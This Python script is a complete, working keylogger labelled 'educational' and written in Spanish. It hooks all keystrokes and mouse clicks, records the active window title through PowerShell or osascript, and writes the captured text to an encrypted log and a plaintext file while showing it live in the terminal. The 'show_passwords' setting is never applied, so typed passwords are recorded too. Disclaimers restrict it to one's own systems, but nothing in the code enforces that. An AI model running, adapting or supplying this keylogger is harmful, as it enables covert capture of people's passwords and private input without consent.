#!/usr/bin/env python3
"""
Keylogger Educativo Visual - Versión Mejorada
Autor: Alvaro Manzo

MUESTRA CLARAMENTE LO QUE EL USUARIO ESCRIBE
Solo para uso educativo y sistemas propios
"""

import os
import json
import time
import threading
from datetime import datetime
from pathlib import Path
from cryptography.fernet import Fernet
from pynput import keyboard, mouse
import socket

# Colores para terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'

class KeyloggerVisual:
    def __init__(self):
        self.setup_directories()
        self.load_config()
        self.setup_encryption()
        
        # Variables para mostrar texto en tiempo real
        self.current_text = ""
        self.current_window = ""
        self.running = False
        self.stats = {
            'keys_pressed': 0,
            'words_typed': 0,
            'mouse_clicks': 0,
            'start_time': None
        }
        
    def setup_directories(self):
        """Crear directorios necesarios"""
        base_dir = Path(__file__).parent.parent
        self.logs_dir = base_dir / "logs"
        self.logs_dir.mkdir(exist_ok=True)
        
    def load_config(self):
        """Cargar configuración"""
        self.config = {
            "log_file": "logs/captured_data.json",
            "readable_file": "logs/readable_output.txt",
            "live_display": True,
            "show_passwords": False,  # Para seguridad
            "capture_mouse": True,
            "capture_windows": True,
            "max_text_length": 1000
        }
    
    def setup_encryption(self):
        """Configurar encriptación"""
        key_file = Path(__file__).parent.parent / "logs" / "encryption.key"
        if key_file.exists():
            with open(key_file, 'rb') as f:
                key = f.read()
        else:
            key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(key)
        
        self.cipher = Fernet(key)
    
    def print_header(self):
        """Mostrar header del keylogger"""
        os.system('clear' if os.name != 'nt' else 'cls')
        print(f"""
{Colors.RED}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║              🔍 KEYLOGGER VISUAL EDUCATIVO 🔍                 ║
║                    CAPTURA EN TIEMPO REAL                     ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.END}

{Colors.BG_RED}{Colors.WHITE}{Colors.BOLD} ⚠️  SOLO USO EDUCATIVO - SISTEMAS PROPIOS ⚠️ {Colors.END}

{Colors.GREEN}📊 Estado del Sistema:{Colors.END}
├── 📝 Archivo de datos: {Colors.BLUE}{self.config['log_file']}{Colors.END}
├── 📄 Archivo legible: {Colors.BLUE}{self.config['readable_file']}{Colors.END}
├── 🖱️  Captura mouse: {Colors.GREEN}✓{Colors.END}
├── 🪟 Captura ventanas: {Colors.GREEN}✓{Colors.END}
└── 🔐 Encriptación: {Colors.GREEN}✓{Colors.END}

{Colors.YELLOW}═══════════════ CAPTURA EN VIVO ═══════════════{Colors.END}
        """)
    
    def get_active_window(self):
        """Obtener ventana activa"""
        try:
            import subprocess
            if os.name == 'nt':  # Windows
                result = subprocess.run(['powershell', '-Command', 
                    'Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | Select-Object -First 1 MainWindowTitle'], 
                    capture_output=True, text=True)
                return result.stdout.strip()
            else:  # macOS/Linux
                result = subprocess.run(['osascript', '-e', 
                    'tell application "System Events" to get name of first application process whose frontmost is true'], 
                    capture_output=True, text=True)
                return result.stdout.strip()
        except:
            return "Desconocido"
    
    def save_captured_data(self, event_type, data, window_title=""):
        """Guardar datos capturados"""
        timestamp = datetime.now().isoformat()
        
        # Datos estructurados para JSON
        event = {
            "timestamp": timestamp,
            "type": event_type,
            "data": data,
            "window": window_title,
            "readable_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Guardar en JSON encriptado
        encrypted_data = self.cipher.encrypt(json.dumps(event).encode()).decode()
        
        with open(self.config['log_file'], 'a', encoding='utf-8') as f:
            f.write(encrypted_data + "\n")
        
        # Guardar en archivo legible
        self.save_readable_format(event)
    
    def save_readable_format(self, event):
        """Guardar en formato legible para humanos"""
        readable_dir = Path(self.config['readable_file']).parent
        readable_dir.mkdir(exist_ok=True)
        
        with open(self.config['readable_file'], 'a', encoding='utf-8') as f:
            if event['type'] == 'text':
                f.write(f"[{event['readable_time']}] TEXTO ESCRITO: {event['data']}\n")
            elif event['type'] == 'key':
                f.write(f"[{event['readable_time']}] TECLA: {event['data']}\n")
            elif event['type'] == 'mouse':
                f.write(f"[{event['readable_time']}] MOUSE: {event['data']}\n")
            elif event['type'] == 'window':
                f.write(f"[{event['readable_time']}] VENTANA: {event['data']}\n")
                f.write("-" * 50 + "\n")
    
    def display_live_capture(self):
        """Mostrar captura en tiempo real"""
        while self.running:
            self.print_header()
            
            # Mostrar estadísticas actuales
            uptime = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
            hours, remainder = divmod(uptime, 3600)
            minutes, seconds = divmod(remainder, 60)
            
            print(f"{Colors.CYAN}📈 Estadísticas Actuales:{Colors.END}")
            print(f"├── ⌨️  Teclas presionadas: {Colors.GREEN}{self.stats['keys_pressed']}{Colors.END}")
            print(f"├── 📝 Palabras escritas: {Colors.GREEN}{self.stats['words_typed']}{Colors.END}")
            print(f"├── 🖱️  Clicks de mouse: {Colors.GREEN}{self.stats['mouse_clicks']}{Colors.END}")
            print(f"└── ⏱️  Tiempo activo: {Colors.BLUE}{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}{Colors.END}")
            
            # Mostrar ventana actual
            if self.current_window:
                print(f"\n{Colors.PURPLE}🪟 Ventana Activa: {Colors.WHITE}{self.current_window}{Colors.END}")
            
            # MOSTRAR TEXTO CAPTURADO EN TIEMPO REAL
            print(f"\n{Colors.BG_GREEN}{Colors.WHITE}{Colors.BOLD} 📝 TEXTO CAPTURADO (ÚLTIMOS 500 CARACTERES): {Colors.END}")
            print(f"{Colors.YELLOW}╔══════════════════════════════════════════════════════════════╗{Colors.END}")
            
            # Mostrar el texto actual (últimos 500 caracteres)
            display_text = self.current_text[-500:] if len(self.current_text) > 500 else self.current_text
            
            if display_text.strip():
                # Dividir en líneas para mejor visualización
                lines = display_text.split('\n')
                for line in lines[-10:]:  # Solo últimas 10 líneas
                    if line.strip():
                        print(f"{Colors.YELLOW}║{Colors.END} {Colors.WHITE}{line[:58]:<58}{Colors.END} {Colors.YELLOW}║{Colors.END}")
                    else:
                        print(f"{Colors.YELLOW}║{Colors.END} {' ' * 58} {Colors.YELLOW}║{Colors.END}")
            else:
                print(f"{Colors.YELLOW}║{Colors.END} {Colors.CYAN}{'Esperando entrada del usuario...':<58}{Colors.END} {Colors.YELLOW}║{Colors.END}")
            
            print(f"{Colors.YELLOW}╚══════════════════════════════════════════════════════════════╝{Colors.END}")
            
            print(f"\n{Colors.RED}Presiona Ctrl+C para detener{Colors.END}")
            print(f"{Colors.BLUE}Los datos se guardan en: {self.config['readable_file']}{Colors.END}")
            
            time.sleep(2)  # Actualizar cada 2 segundos
    
    def on_key_press(self, key):
        """Manejar pulsación de teclas"""
        try:
            self.stats['keys_pressed'] += 1
            
            # Obtener ventana activa
            current_window = self.get_active_window()
            if current_window != self.current_window:
                self.current_window = current_window
                self.save_captured_data("window", current_window)
            
            # Procesar la tecla
            if hasattr(key, 'char') and key.char:
                # Tecla normal (letra, número, símbolo)
                char = key.char
                self.current_text += char
                
                # Contar palabras
                if char == ' ':
                    self.stats['words_typed'] += 1
                
            else:
                # Teclas especiales
                key_name = str(key).replace('Key.', '').upper()
                
                if key == keyboard.Key.space:
                    self.current_text += " "
                    self.stats['words_typed'] += 1
                elif key == keyboard.Key.enter:
                    self.current_text += "\n"
                    # Guardar línea completa
                    lines = self.current_text.split('\n')
                    if len(lines) >= 2:  # Hay una línea completa
                        complete_line = lines[-2]
                        if complete_line.strip():
                            self.save_captured_data("text", complete_line, self.current_window)
                elif key == keyboard.Key.backspace:
                    if self.current_text:
                        self.current_text = self.current_text[:-1]
                elif key == keyboard.Key.tab:
                    self.current_text += "\t"
                else:
                    # Otras teclas especiales
                    self.save_captured_data("key", f"[{key_name}]", self.current_window)
            
            # Limitar longitud del texto para evitar memoria excesiva
            if len(self.current_text) > self.config['max_text_length']:
                # Guardar texto antes de limpiar
                self.save_captured_data("text", self.current_text, self.current_window)
                self.current_text = self.current_text[-200:]  # Mantener últimos 200 caracteres
            
        except Exception as e:
            pass
    
    def on_mouse_click(self, x, y, button, pressed):
        """Manejar clicks del mouse"""
        if pressed and self.config['capture_mouse']:
            self.stats['mouse_clicks'] += 1
            mouse_data = f"Click {button} en ({x}, {y})"
            self.save_captured_data("mouse", mouse_data, self.current_window)
    
    def start_capture(self):
        """Iniciar captura"""
        self.running = True
        self.stats['start_time'] = time.time()
        
        print(f"{Colors.GREEN}🚀 Iniciando captura visual...{Colors.END}")
        print(f"{Colors.YELLOW}Los datos se guardarán en tiempo real{Colors.END}")
        
        # Limpiar archivos anteriores
        if os.path.exists(self.config['readable_file']):
            os.remove(self.config['readable_file'])
        
        # Escribir header en archivo legible
        with open(self.config['readable_file'], 'w', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write("KEYLOGGER EDUCATIVO - CAPTURA DE SESIÓN\n")
            f.write(f"Inicio: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("SOLO PARA USO EDUCATIVO Y SISTEMAS PROPIOS\n")
            f.write("=" * 60 + "\n\n")
        
        # Iniciar listeners
        keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
        mouse_listener = mouse.Listener(on_click=self.on_mouse_click)
        
        # Iniciar thread de visualización
        display_thread = threading.Thread(target=self.display_live_capture, daemon=True)
        display_thread.start()
        
        try:
            keyboard_listener.start()
            mouse_listener.start()
            keyboard_listener.join()
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}🛑 Captura detenida por el usuario{Colors.END}")
        finally:
            self.running = False
            keyboard_listener.stop()
            mouse_listener.stop()
            
            # Escribir resumen final
            with open(self.config['readable_file'], 'a', encoding='utf-8') as f:
                f.write(f"\n\n{'=' * 60}\n")
                f.write("RESUMEN DE LA SESIÓN:\n")
                f.write(f"Teclas presionadas: {self.stats['keys_pressed']}\n")
                f.write(f"Palabras escritas: {self.stats['words_typed']}\n")
                f.write(f"Clicks de mouse: {self.stats['mouse_clicks']}\n")
                f.write(f"Fin: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 60)
            
            print(f"\n{Colors.GREEN}✅ Datos guardados en: {self.config['readable_file']}{Colors.END}")

def main():
    """Función principal"""
    keylogger = KeyloggerVisual()
    
    try:
        keylogger.start_capture()
    except Exception as e:
        print(f"{Colors.RED}❌ Error: {e}{Colors.END}")

if __name__ == "__main__":
    main()
